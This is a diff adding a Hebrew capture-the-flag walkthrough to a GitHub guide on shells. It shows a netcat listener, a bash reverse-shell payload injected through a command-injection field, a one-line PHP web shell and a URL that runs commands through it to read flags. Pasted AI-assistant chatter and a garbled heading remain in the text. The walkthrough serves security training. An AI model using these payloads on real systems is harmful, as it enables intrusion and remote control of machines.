@@ -322,21 +322,121 @@ c99 shell: Web Shell מוכר וחזק מאוד עם יכולות נרחבות.
 * `MACHINE_IP:8081` - אפליקציה הפגיעה ל-**Command Injection**.
 * `MACHINE_IP:8082` - אפליקציה הפגיעה ל-**Unrestricted File Upload**.
 
+* מעולה, בוא נמשיך לחלק המעשי של המדריך (Task 7) בפורמט GitHub מקצועי. חלק זה מתמקד ביישום הידע שצברנו לטובת פתרון המעבדה והשגת ה-Flags.
+
+---
+
+## 🛠️ תרגול מעשי: פריצה והשגת Flags
+
+בחלק זה ניישם את הידע שצברנו על **Reverse Shell**, **Command Injection** ו-**Web Shell** כדי לפרוץ לשרת המטרה.
+
+### 🌐 כתובות המעבדה
+
+לאחר לחיצה על כפתור **Start Machine**, המערכות הבאות יהיו זמינות (החלף את `MACHINE_IP` בכתובת ה-IP שקיבלת):
 * <img width="863" height="564" alt="image" src="https://github.com/user-attachments/assets/06c860ae-e4f2-46e4-a5f5-259ee91280ae" />
+* `MACHINE_IP:8080` - דף הבית (Landing Page).
+* `MACHINE_IP:8081` - אפליקציה הפגיעה ל-**Command Injection**.
+* `MACHINE_IP:8082` - אפליקציה הפגיעה ל-**Unrestricted File Upload**.
+
+---
+
+### 1. ניצול Command Injection לקבלת Shell
+
+במשימה זו נשתמש בפגיעות הזרקת פקודות בפורט **8081**.
+
+**שלב א': הקמת מאזין (Listener) במכונה שלך:**
+פתחו טרמינל (ב-AttackBox או ב-VPN) והריצו:
 
 <img width="904" height="781" alt="image" src="https://github.com/user-attachments/assets/0d44df9e-9dc7-4530-9341-4f27d19f58d1" />
+```bash
+nc -lvnp 4444
 
-
-
+```
 <img width="551" height="478" alt="image" src="https://github.com/user-attachments/assets/06c31bc1-bda4-4e2b-9a99-3d3abd1b50a1" />
+
+
 
 <img width="1770" height="550" alt="image" src="https://github.com/user-attachments/assets/71c3d9a1-4758-4fd7-81f7-7a349100b367" />
 
 
 
+**שלב ב': הזרקת ה-Payload:**
+באתר הפגיע (פורט 8081), הזינו פקודת Reverse Shell בשדה הקלט. לדוגמה, שימוש ב-Bash:
+
+```bash
+; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+
+```
+
+*(החליפו את `YOUR_IP` בכתובת ה-IP שלכם ברשת ה-VPN).*
+
+**שלב ג': קריאת ה-Flag:**
+לאחר קבלת החיבור בטרמינל, חפשו את ה-Flag בתיקיית השורש:
+
+```bash
+cat /flag.txt
+
+```
+
+---
+
+### 2. ניצול Unrestricted File Upload לקבלת Shell
+
+במשימה זו ננצל את אפשרות העלאת הקבצים בפורט **8082**.
+
+**שלב א': הכנת Web Shell:**
+צרו קובץ בשם `shell.php` עם התוכן הבא:
+
+```php
+<?php system($_GET['cmd']); ?>
+
+```
+
+**שלב ב': העלאה וגישה:**
+
+1. העלו את הקובץ דרך ממשק האתר בפורט **8082**.
+2. גשו לקובץ שהעליתם (לרוב בנתיב כמו `/uploads/shell.php`).
+3. הריצו פקודות דרך ה-URL כדי למצוא את ה-Flag השני:
+`http://MACHINE_IP:8082/uploads/shell.php?cmd=cat+/flag2.txt`
+
+---
+
+#ת (Task 7)
+
 <img width="1817" height="726" alt="image" src="https://github.com/user-attachments/assets/960aee2a-9309-4d8f-8073-bd427e7a9501" />
 
-<img width="1790" height="641" alt="image" src="https://github.com/user-attachments/assets/90834e38-ae65-4122-a98d-20d4fedaff73" />
+
+
+||
+| --- | --- |
+| מהו תוכן ה-Flag בתיקיית ה-`/` שהושג באמצעות Command Injection? | `THM{...}` |
+| מהו תוכן ה-Flag בתיקיית ה-`/` שהושג באמצעות Web Shell? | `THM{...}` |
+
+---<img width="1790" height="641" alt="image" src="https://github.com/user-attachments/assets/90834e38-ae65-4122-a98d-20d4fedaff73" />
+
+## 🏁 סיכום המדריך
+
+במדריך זה למדנו:
+
+1. **מהו Shell** וכיצד הוא משמש תוקפים לאחר פריצה.
+2. ההבדלים בין **Reverse Shell** (היעד מתחבר אלינו) ל-**Bind Shell** (אנחנו מתחברים ליעד).
+3. כיצד להקים **Listeners** (מאזינים) בעזרת כלים כמו `nc`, `socat` ו-`ncat`.
+4. שימוש ב-**Payloads** בשפות שונות (Bash, Python, PHP).
+5. פריסת **Web Shells** לגישה דרך הדפדפן.
+
+---
+
+**האם תרצה שאוסיף חלק נוסף על "ייצוב המעטפת" (Shell Stabilization) – שלב קריטי שבו הופכים Netcat Shell פשוט לטרמינל מלא עם פקודות כמו `clear` וטבּולטור?**
+
+
+
+
+
+
+
+
+
+
 
 
 <img width="988" height="696" alt="image" src="https://github.com/user-attachments/assets/af2ae22f-b7f3-4983-a082-400a22e17b72" />
